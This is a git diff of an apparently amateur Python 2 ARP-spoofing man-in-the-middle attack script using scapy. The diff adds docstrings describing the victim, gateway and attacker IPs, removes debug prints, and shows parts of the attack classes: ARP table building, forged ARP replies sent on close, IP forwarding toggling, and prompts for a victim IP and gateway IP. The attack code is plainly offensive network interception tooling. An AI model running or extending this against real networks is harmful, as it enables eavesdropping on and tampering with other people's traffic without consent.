@@ -16,11 +16,18 @@ from uuid import getnode as get_mac
 
 
 class Attack_Info(object, ):
+    """
+    This class contain all the data nesscry for the attack
+    """
     def __init__(self,victim_ip ,gate_ip , my_ip):
+        """
+        victim_ip: the victim`s ip
+        gate_ip: the gateaway (router) ip
+        my_ip: the attacker`s ip
+        """
         self.mIP = my_ip
         self.gIP = gate_ip
         self.vIP = victim_ip
-        print "gip:", self.gIP
         self.mac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
         self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]}
 
@@ -58,6 +65,9 @@ class Attack_Thread(object, ):
         self.stop = threading.Event() # used for closing thread and sub threads cleanly
 
     def close(self,):
+        """
+        closes the attack
+        """
         self.stop.clear()
         self. set_ip_forward(0)
         sp.send(sp.ARP(op=REPLAY, pdst=info.gIP, psrc=info.vIP, hwdst=BROADCAST,
@@ -124,8 +134,8 @@ class Mitm_Thread(threading.Thread):
            
 
 
-print "newstfsdt"
 vIP, gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
+#one liner from web should replace it with something more readeble and elegnt
 mIP = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
 info = Attack_Info(vIP, gIP, mIP)
 attack = Attack_Thread()
